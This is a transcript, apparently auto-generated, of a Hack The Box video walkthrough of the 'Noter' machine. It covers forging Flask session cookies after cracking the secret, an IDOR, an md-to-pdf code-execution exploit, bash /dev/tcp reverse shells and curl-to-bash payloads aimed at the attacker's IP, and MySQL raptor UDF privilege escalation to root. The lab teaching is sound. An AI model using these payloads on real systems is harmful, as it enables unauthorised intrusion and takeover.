 what's going on youtube this is ipsec manure nerder from hack the box which starts out with a basic web application that has a few vulnerabilities the primary one to start off with is a weak signing key for its flask session so you can crack that then forge cookies to become anyone you want if you become the blue user you get information on how the ftp passwords are created that lets you log into ftp server as blue as ftp admin and that will leak the source code to the web application that goes down to other vulnerabilities one of which is a um vulnerability within a node.js library that allows you to convert markdown to pdfs so you get a shell on the box and then if you poke at the mysql server you'll see that it's running as root so you can do the raptor user defined function exploit in order to get code execution on the box so with that being said let's just jump in as always we're going to start off with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it murder and then the ip address which is 1010 11.160. this can take some time to run so i've already ran it looking at the results we have just three ports open the first one being ftp on port 21 and it's running vsftpd version 3.0.3 and generally whenever i see vsftpd and it's version three i can ignore it because if we run search point on it so vs ftpd um the only thing out is a remote denial or service so there's no rces here we could try like anonymous login but nmap would tell us so um there's not too much here i guess we could look at the login banner but um yeah i'm guessing end up would show that ftp 10 10 11 160. yeah so not much to do there ssh it does expose it's an ubuntu box and then we have an http server on port 5000 and it's running workzug or i don't know how to pronounce that but it is python3810 so let's just go take a look at that port so 10 10 11 160 port 5000 and we get this welcome to noter and i have darkly installed so i'm just going to press ctrl shift a to make this into dark mode because that's just easier so if we go to home we get here if we go to notes it wants us to log in we do have a register function but first i want to just log in we can try like admin admin and we get invalid credentials so let's register an account the name we'll do ipsec email root ipsec dot rocks username ipsec password is just gonna be password and we can now log in so if i log in with ipsec can we do a bad password we see invalid login remember we did admin it said invalid credentials so we have a way to validate um users on this box so we want to have some recon going on in the background while we work so let's intercept this request set up something to brute force usernames real quick and we can do that while we do something else because things like that can always take a little time so i just put this in burp suite so i can see it's a post request to log in and the fields are username and password so what i'm going to do is run you http 10 10 11 160 slash login then dash d for data username is equal to fuzz because we want to change this and password is equal to please subscribe and we'll hope that's no one's password on this box because it could screw things up uh dash w for word list and i'm going to do vi uh we'll call this users.txt and i'll do ipsec test um does not exist admin so we just want to find one valid user here so if i do users.txt this should be all i need and didn't work oh url we need this to be port 5000 and still nothing this is a post request and one of the most annoying things with fuff is it doesn't automatically add the content type header so i'm going to do dash h content type and we're going to copy and paste it from here the application xw url form encoded and that looks much better so looking at this the size is going to be different i'm guessing the username is echoed back in the form which is going to make this a bit tougher if we're just used to filtering upon one of these things because the only dynamic field does change if i send this to repeater if i search for ipsec maybe the default is here if i do admin that's going to be in here as well so this is why the length is changing um we probably could like filter on size because credentials is much longer than login but that's not a good way to do it so i'm gonna do dash m r which is match regex and if you do fluff dash h search for regex you can see dash mr and i'm just going to search for invalid login and now it's scraping all the results and only going to show us the ones with invalid login which has ipsec here so we had now have a way to enumerate users on the box i'm going to do find slash opt set list and grep dash i for users or user let's do username and maybe this default username.text is a good starting point um there's also 10 million usernames what is this uh this looks better i didn't like the other one because like one created in all like i don't think those are deep like good users to choose from but probably could have used that list i'm going to use this one because it seems more realistic the only thing i don't like about this is how long the list is i don't know if this is going to make fluff take a long time or not but this is why we're running it in the background so we can see we already gotta hit blue so there's a potential user but let's just keep on going on through this box so ipsec password was password we can turn burp suite off submit this to login and we have add note and upgrade to vip if we upgrade to vip it says we're not able to so let's go back and add a note and i'll do actually let's do two times two give it some good ol ssti server-side template injection uh it needs to be 30 characters long i also want to do html so we'll see if test is in bold submit this uh no ssti at this said 4 here we know we could potentially execute code if we go to edit everything looks fine it's not processing this at all i don't see a way to view only edit we could potentially um fuzz this b so maybe there was like view underscore note and see if we find other functionality there but and this as far as we go there's nothing we can do here of this was three so i'm going to try a idor so indirect object reference and we get an error on one two we can view three four is an error five's an error all nines error so if the note is valid and i'm assuming we can read it it would display this otherwise it just gives us a server error so i'm going to now look at um my cookies so uh let's see f12 we go over to storage we have this session and interesting enough the username does not appear to be case sensitive um so this is what the cookie was and it looks like it is a um jwt except this middle piece is really small so i'm going to actually let's just go to jwt.io that seems like a good idea so jwt.io and let's see we can paste this in and it decodes the header however the payload is weird um and i guess the header is weird in terms of jwt because most of the time let's just make sure they're still my clipboard refresh the page the header is going to be like the algorithm and type it explains what the token is and then the payload is the data what we have is data in the header and the payload is some random like number something that's not an ascii and then the signature we don't know exactly what this is normally the header would tell us how this is um hashed or signed or whatever you want to call it so um we know it's a python app because the work zug in the server header and i know just based upon experience this is how flasks handle sessions or what their session cookie looks like so i'm going to try to first crack this hash because i always like doing long running tasks in the background while i work and this could take a while so i'm going to go over to hashcat and i asked h to crack and it's a box on my local network because i don't like cracking on the machine i'm recording from because it could lead to like drop frames things like that so um i'll do hash cat i think it's dash dash example dash hashes and i'm gonna do less and i'm gonna search for flask maybe a capital f uh maybe we should update hash cat let's see get pull not a repository i'm pretty sure if we do hash cat example hashes and search for this so flask flask session cookie so it definitely does have it it's mode two nine one hundred i'm just gonna do grep for this two nine one hundred yeah my version of hash cat definitely does not have it so if we do hash cat download let's see i think we just download the binary and run it let's copy and then move hashcat to hashcat.old there we go my horrible naming convention so download hash cat use 7-zip to extract it a 7-zip x there we go would it download to oh cd hash cat dash six two six there we go and there's a bin so let's search example hashes and now we do have it so if i do less flask and we see it here so um let's make the hashes v hashes we'll call this murder and we have to grab the hash again or the um cookie there we go paste that's not the right clipboard there we go and then we can say dot slash cat dot bin mode 29 100 word list opt word list rocky dot text and then the hashes file so hashes let's see it's not dash w it's been a while actually since i used hashcat in a video um or hash count in general there we go so let's just make sure this starts no hash is loaded token length that is bizarre 29 100. so one two three make sure that has a line break and i guess we can copy this as well if it only processes one then we know something is broken here so let's get this started line one token length exception so it does not like how long this is i guess let's see echo dash n base64-d that looks fine so both these look like they're just raw integers right so i'm going to copy this other one so let's look at exactly how this looks like echo dash n base64-d okay and we can try this base64-d so both these tokens look similar however we'll get a length exception from ours so i'm guessing something is wrong with this mode because no matter what we do i think it errors on that so i just moved it to line two to make sure it wasn't like the first line or something but yeah we have a token length exception again so not sure what that is but i'm guessing we can't use hash cat to crack this thankfully there is another program so if we google hack tricks flask and go here it talks about using a tool called flask dash uns sign and it's part of pip so if you don't have you can do pip 3 install and we can first try to decode the cookie so let's try this so i'm going to do flask unsigned decode cookie and we don't have it on a clipboard i guess we can go to jwt.io i've already navigated away from that page let's just pull it from bash history so flask dash unsign decode cookie and paste this so that works now the next thing it has is talking about a brute force so we can do dash dash word list and unsign and i guess we want to pass that no literal thing potentially i don't know what that does but it's telling us to so we do it we don't need the decode option anymore our word list does that exist um ls user share word list rocky.text it does and then because it has it let's do it as well and it's attempting to brute force and it does find it as secret123 so now that we can sign this cookie we could create a um word list of other cookies because if we go to jwt i o um the username is right here so we know the signature we can now craft our own cookie and put other usernames and we know a valid username it's blue so we could literally just go with uh flask unsign let's go back to hack tricks and we can sign cookie so let's do this real quick and this method is unintended because you weren't supposed to be able to enumerate the username this way but we'll cover the intent way at the end of the video because it does involve a little bit of coding and i figured we'll just move that to the end of the video if you really wanted to watch it so um logged in true and then user was blue i believe like that so that's the cookie and a little bit of cookie coating just means we build a bunch of cookies and use fluff or w fuzz to um brute force it that way and this password was secret one two three so now we have a cookie and all this is let's just do this again and if we do flask unsign decode cookie it's just telling us the user is blue the one tricky thing i think a lot of people may mess up as they put the boolean in quotes one it's not so let's go back to the page at noder and we can go to the sessions put the new cookie in refresh and we get an internal server error because we're in note 3. if we just go back to the dashboard and click on notes uh internal server error maybe dashboard everything's crashing that's not good um session paste so logged in gonna put these in double quotes maybe let's change the quotes around i don't know if that matters if i want to say jwts it is double quotes in these parameters and some libraries are very picky about that so let's copy this new cookie paste it in refresh welcome to nerder home notes we still get an internal server error so something is not right let's see i wonder if there's like an exclamation point at the end maybe it's secret it was secret one two three exclamation point was that it um this is also going to test two things it'll test if we get internal server error if the signature does not match um so unauthorized please log in so we know we had the signature right because um it didn't kick us out so what we screwed up was this logged in true user blue most likely um maybe flask unsigned doesn't sign it correctly i don't know yet let's try logging in with ipsec password paste or cookie let me make sure i go to the beginning to the end delete paste dashboard internal server error okay so let's try one last thing um we have tried changing the secret around and we know we have the right secret here because when we do the wrong one it destroys our session and we get directed to a login page we change the quotes around so we know it's not that the behavior did not change at all the one thing we didn't do is potentially just complete user error maybe it's username not user and i just typed to user when i was making this cookie i always should copy and paste and not type but i rarely do that so let's put this in refresh the page and we get logged in as blue and we see a note from december 22nd and it says before the week and if we click edit we can see delete the password note ask admin team to change the password so there's nothing really here let's try note 1 to see if there's anything here we get internal survey error let's just go over to notes and we have a note slash one can we do note slash two as well so this may be how we can view notes and looking at this we have noder premium membership from ftp admin and says hello thank you for choosing a premium service now you're capable of doing many things with the platform etc etc etc it says our username is blue and our password is blue at noder so let's log in to the ftp server so ftp 101011 160. type blue i think i put the password in it says login successful do a dir we can get policy.pdf look into files there's nothing here i think it's dio dash a to show hidden files don't see anything there i'm going to do exif tool against policy we can see it's just a i guess mark down to pdf uh wk html to pdf doesn't seem to be any username or anything here so um let's open up a file browser and then we can go into htb noter and open policy.pdf and it's just talking about the password policy and saying um it's in the format of username at site name exclamation point so the site name is noder exclamation point there was a note from this from ftp admin so let's try logging in with ftp admin on this so ftp ftp underscore admin ftp underscore admin exclamation point nerd or exclamation point or um it was ftp admin at nerd estimation point that's why i did the password i think i said that wrong um we got two backups so let's download them both so get and do a second get here and then we can i guess do a dir-a for good measure make sure there's nothing hidden and two zip files so i'm going to make the directory app go in here make do one and then unzip app backup1635 and the reason why i did that is whenever i unzip things i like make my own directory because they unzip to the current working directory can make a mess right so cd2 unzip dot dot slash dot dot slash app backup 1638 and now we have both unzipped i'm just going to do a diff dash r 1 2 and it's going to show me what's different i'm going to do dash y so it's side by side and then we can do less dash capital s and looking at this we see the lines here differ so it looks like they went away from hardcoded password of nildog and replace it which is db userdb password okay we have attachments so this one on the right is the new one so attachment directory is new we got ms slash attachments if we go to the web server if we do misc attachments not found um noder so it doesn't look like that's a web directory we can scroll down to find what else is different it looks like we have a whole export note functionality and it looks like my less has cut things off so let's just look at the later one and app.pi and what was it export note there we go so let's see um we're doing select star from notes where author is equal to s that's going to be the session username fetch all export note local string id so making sure we are a vip user select star from note id session so it's grabbing the note and then passing it to this md to pdf.js i don't know exactly what note body is i'm just glancing at this we see note is equal to the row and the row is going to be select star from notes where id is equal to something and also is equal to something so i'm guessing um body is going to be the note body so let's try something real quick and see if we can just uh get command execution into like just this because if we can get the note body to have like a semicolon then i think that will work to get command execution executable yeah so let us dub go in here and actually how do we export this app to app.pi export so export note we want to do export note local id so notes how do we make one let's go to dashboard add note title test the body is going to be uh semicolon then let's just do over shell dev tcp 10 10 14 8 9 000 1 0 and 1 like that i'm gonna do bash dash c semicolon we can try this to see if this works submit note test we are note number three so i guess the database has been reset because this was a note but export note local three it's hanging which i think is a good sign nc lvmp 9001 let's see export note local 3. we did not get a shell though internal server error so we screwed something up i'm going to put this whole thing in quotes like this i can do bin bash submit refresh this still nothing let's let's see make this bigger so you can see it so now i'm going to wrap it in that c dev tcp 10 10 14 8 that looks good submit refresh still nothing if i export no let's do two make sure this works um export note local 1 redirect me there that is weird v let's see export note local so note id is definitely going to be three and author is our session so i think we just have something wrong with our command or maybe this is not injectable let's edit i guess we can try simplifying this let's just do curl 10 10 14 8. oh it may not have curl on it most boxes have curl run this pseudo nc lvmp 80. so we didn't get a call back see export notes if we export this to pdf does this do the same thing yes it does put it in backtext still nothing so what i'm going to do is take another look at something so let's v app to app.pi export note so we have an export note local and then we also have export note remote and pretty much the same thing it's just running this node command let's look at exactly what this is md to pdf so nerder let's go app2 misc md to pdf and it's just using a node library md2 pdf so let's see if there's any known vulnerabilities in that so node md to pdf whoops like that rce and we have something here so it looks like if we make this payload potentially we can get it so i'm going to copy this and let's see let's go back to this dub dub dub v [Music] test.md [Music] paste this in and all we want to do is send a reverse shell so bash c i dev tcp 10 10 14 8 9 000 1 0 and 1 like that and let's see if this does it uh we need to start a web server and then if we go back to noder we can do notes or maybe home dashboard where is it export notes url so http 101011 uh 1010 14 8 port 8000 i think i called it test.md export error occurred while exporting the note so we downloaded it but it aired out and we did not get a shell so let's view our vi test.md and see where we could simplify this there's a lot of bad characters in this so i'm just going to have this curl so curl 10 10 14 8 8 000 i'm going to call it rce and if we get that second curl request we know we definitely have our ce so export this again it's taking a while and we just got test let's see should this be json so we got the third request but still no slash rce so looking at this ver payload is equal to dash dash dash jsn i wonder if we need to put that line break so let's get rid of backslash n and actually put a line break and this was jsm export this we get test md but we still aren't getting code execution i wonder if it goes like that export still just getting test but nothing so let's go back to the payload and looking at this i wonder if this was supposed to have a backslash n and this is js then newline newline let's try that so let's go back here and do backslash n and add this backslash n back in and then after this we will try it with actual line breaks let's see i think that's in the right spot we should be able to just go back here export and finally we get a hit on rce so that was it the website we're copying from uh had a mistake so now we should be able to do um let's just get rid of this curl and do our very shell so bash dash um c [Music] i devtcp 1010 14 8 9001 like this okay export note we got hit but did not work so maybe there's a lot of bad characters here let's just go back to the curl so if we curl 10 10 14 8 8 000 rce save this hit it again we got a hit on rce we can just pipe that over to bash and then in www v rce we can do bash dash c bash dash i dev tcp 10 10 14 8 9 001 like this and see if this works curl test rces hit and we did not get a shell well we're already executing it with bash so we don't need that let's see cat rce copy paste the shell works we're in the right directory get test get rce nothing let's try changing the port so i'm gonna do nclvmp443 we have to run this one with sudo and we'll send a reverse shell there let's do vrce 443 save that and let's export this get hit rce and we're screwing something up i just don't know what rce put spaces there export we go we needed spaces um out of curiosity i do want to test on 9001 just to see if that was also an issue but those small things are definitely a pain to troubleshoot and you can imagine when you're doing like exams or things like that like that can eat up a lot of time you can miss vulnerabilities just because you don't spend enough time playing with your shell code or whatever um i know that's not gel code bad choice of words but um your payload so let's do python 3 import pty pty dot spawn ban bash okay stty raw minus echo fg and now we have a show to the box as svc i guess this is service and remember there was a mysql password in the older one right or maybe it's the new one let's go back here grab dash i pass let's see db underscore password is it actually the let's grab db underscore from app.pi let's do mysql dash u db user dash p and we'll type db underscore password that is the actual credentials that is that is funny um show databases use app that's like when you like get a cisco config out of a backup and the password's actually five stars uh let's just uh show tables select star from users there's only one that's blue wilson select star from notes so you can just view everything here from notes nothing three notes we know there's three um we can see it actually puts the p uh like that and i'm guessing i wonder if we have to use single quotes to break this we'll try with that command execution injection at the end of the video but let's run lin p's on this so i'm going to go into dub dub dub let's go to github i'll nps i always just like downloading the latest whenever i run this tool because it does change pretty often we can see it changed 23 hours ago so yesterday we want to go over to releases linps.sh save it to disk move downloads lin p's here girl 10 10 14 8 8 000 limps.sh pipe it over to bash and i'm going to pause the video we'll resume it when this is done so lin piece is now done we can go back and look at where it begins so first it's telling us it's vulnerable to the cve which i'm guessing is probably like pwn kit or something i think that came out after this box we're not going to dive too much into it uh policy kit so let's keep going down we have three partitions sda one two three if i saw like sdb i'd be more interested or maybe an extra partition but i'm guessing one's um boot swap and then the root partition so nothing too interesting here i'm kind of scrolling looking at colors tells us that cve is prone kit let's see it is a vm now we have processes so it's just highlighting the processes that we're running cron jobs looks like everything is standard here service files dot socket not sure exactly what this stuff is networking information active ports it doesn't look like there's any ports we don't expect we have 5000 which is the um web app my sequel this is going to be system d resolve d i don't know why systemd listens on 53 for dns the whole thing is weird to me never looked into it i'm sure there's a good explanation then we have just 22 for ssh on ipv6 i don't know what 36 751 is it's probably some weird like um neighbor discovery protocol for ipv6 so looking at our user nothing interesting users on the box root and svc have consoles nothing we didn't know curl that's just highlighted because i searched up for curl to get to the beginning of the input my sequel version and we're running as root so this is interesting there is a my sequel user on the box so if we go up and look for let's see mysql yeah uid 114 but it's running as root which does open the ability to switch to that user so before we do that let's grab db again out of this so we can mysql to log in and i'm going to select one into out file we'll just do temp 1. access denied for db user so i guess this user can't oh but we did have the root user from before so maybe it's this password so let's go cd1 scrap db underscore out of app uh let's see v app.pi mysql crap mysql how to app so let's try this password and that lets us in so let's do select one into out file temp one and we wrote it so if i go into temp and look at who owns one ls-la temp 1 it is root so since we are root and we can write to the disk as root um we can use a user defined loader to exploit this box i don't know why i just got another shell because i think we have to drop something to disk first so let's just exit that um it is the raptor exploit so raptor underscore udf mysql and let's go and grab this file and let's see the raptor udf.c set paste i guess we can just w get it maybe we can w get it i'm not sure why my box didn't want to let's just copy and paste there we go and if we look at this i know i misspelled it let's wrap door uh it just wants us to gcc it so we got two things to do mysql login and then we create a table and then we insert into that table the udf file so we're putting the binary file into the table and then we're going to select it and write it to user lib this is why we have to be root in order to do this because the user defined functions in mysql have to come out of this lib directory and we can't do that as a normal user but since we're running as root we can so that's why you can write there and then we create the function do system and map it to this user defined function and we can view the function does exist so do system goes to the raptor udf and if we do select we can execute out of it so that's essentially how it works at a very very high level um let's just do control alt shift i can't change this to dark mode okay let's just copy this then copy the next thing uh let's see unrecognize command line option dash w uh i was thinking we had unicode but it doesn't look like we do do we put this in quotes w1 our space is real uh commas really spaces no let's copy it again where is it gcc right here paste oh i think that's wl not w1 that's weird yep there we go so now we have it we should log in with my sequel so go back to our shell and we have to get the password so app one app.pi grab my sql copy this paste and now we can use my sql create table let's insert whoops there we go what if that no query specified was supposed to happen oh nope it's not um we did not download this yet so let's go to temp wget 10 10 14 8 8 000 the file is raptor udf.so okay now we can log in use my sql we've already created that table so this will be temp then raptor udf.sl then two parentheses to close it semicolon we've added it so now we want to write the file to use a lib and it said success so we wrote it now we create the function do system so name raptor udf.sl can't open shared library ls let's see ls user lib raptor udf.sl it does exist it is data let's go temp it's elf so it did not like how we copied that if we can we examine it so xxd head dash one this can be the temp uh we need user lib head dash one and put an extra uh byte here which may be what's screwing it up that sucks let's see let's go back in here we can try creating this function again so r a p t o r u d f s l i'm just going to copy and paste i want to make sure there's no typos anywhere can't open shared library i wonder if it's in like lib64 ls user lib lib64 it could be in there or lib32 um it's saying file does not exist so that leads me to believe it's a issue with where we're writing it it's not saying like unexpected file type so lib64 let's try this i use mysql this whole line that's weird create table we gotta insert slash temp raptor udf.so we wrote it to lib64 we can see if this works still can't open it let's try a show variables like plugin and this is just looking into the um mysql like um variables and it looks like it's changed since it's mariadb let's see let's put it in here so enter dump file if we paste this mysql foo does not exist of course it doesn't this is getting annoying how it's reverting something i think so we can create table foo insert into this is going to be slash temp we should have an up arrow there we go and then we want to change where this goes so the dump location is going to be this user lib directory and then raptor udf.sl okay i really should fix my terminal create function can't find symbol do system init in binary well that's looking better um i wonder if it still created the function did not but that is much better that we put it in the right location however don't like the error message see so what we're going to do real quick i'm sick of all this hopping around uh cd home maker.ssh cd.sh and let's put an authorized key here so sh dash keygen svc think dash f there we go cat id or svc.pub and we'll echo this into a file so echo authorized keys sh-i svc svc at 10 10 11 160. okay we can get in and go to a new window dash i svc and the whole reason for a new window i can run tmux on this guy there we go my sequel dash u root password i think i typed it yep so now we have a real shell on this box so let's use my sql database changed create table and i'm guessing it's probably how we compiled this let's see i wonder if we have to compile this for like 64-bit at least that's easy to check for because we can just do a file against it so if we file temp udf a cd temp file raptor udf it is 64 bit so that's not it let's go back to that error message let's see where is it create function cannot find simple uh symbol do system init in library so i'm going to copy this and let's also go to a code dub dub dub v raptor and then search for a net do system we don't have a do system in it do system annette okay maybe our exploit's just bad let's go back try the second link this is do system internet did i just not copy it no this one definitely does not huh so let's copy and we're going to redo everything so let's just kill a dub dub dub server and make a new one because i don't want any possibility of one of the old um files making the way in so that's why i just moved to this raptorudf.so paste we have the do system init that looks better so let's do the gcc command oh let's see so this is udf2 fancy uh what oh this is dot c there we go and now we can copy this i don't know why they do w1 that's weird okay so now we just have to put it onto the box rm raptor w get 10 10 14 8 8 000 raptor udf.sl is it raptor udf2 raptor udf2.sl okay so we already did the create table command so use my sql insert into so we want to copy this one and this is slash temp mysql foo does not exist there's got to be a crown that's going back and deleting that so we created it we loaded the file we want to [Music] grab the location so this was where is that the plugin directory dump file and then raptor udf2 dot so okay so we just wrote the file now we can create the function and hope this actually works that looks better so if we select the function we do have it and we wrote the id to temp out so if i cut out a permission denied which is good scrap out root owns it that's probably about the right length if i do id out 2 it's 45 um i'm guessing it's because the uid is gonna be three longer this is one shorter so we got slight differences between the two but i'm guessing that is correct so let's send it a shell so i forgot we have two different things so let's oh we're doing ch own raptor raptor that's funny uh we could do sbc svc and it deleted everything so let's create the table insert the value see can i open i need to put these in a text file or something and just copy and paste so that's what i'm going to do real quick this is annoying um cd temp v shell so use my sql create table we gotta do the load file then dump file is next let's see where's dump file okay [Music] copy that one and then after we dump the file we can just create the function and then do our command okay so do system and we're just going to give a reverse shell so bash c we're going to make this double quotes here i dev tcp 10 10 14 eight nine thousand one zero and one like that cat shell this looks good and see lvmp 9001 paste do system does not exist can't open the file so we did that select start user lib raptor 2 udf create function okay it's hanging which is a good sign because now we are root so let's make dirt.sh and let's just echo our key in here so we can take a look at some other things on this box so cat svc.pub and we can copy this and we want to where is our shell this one echo paste authorized keys okay sh i svc root at 10 10 11 160. awesome but unfortunately i'm going to cut the video here i know i said i put some beyond root stuff here however um i didn't want to make this video another like 30 40 minutes so instead i decided to try something new and i'm gonna break the beyond root stuff into its own videos um you can expect those probably like monday wednesday i definitely plan on doing the uh hashcat to fix it so we can crack this flask session cookie i also want to um show how i go troubleshooting this rce thing that i failed at earlier with command injection so if you want other things of this video let me know in the comments and maybe i'll add it throughout the week take care guys and i'll see you next time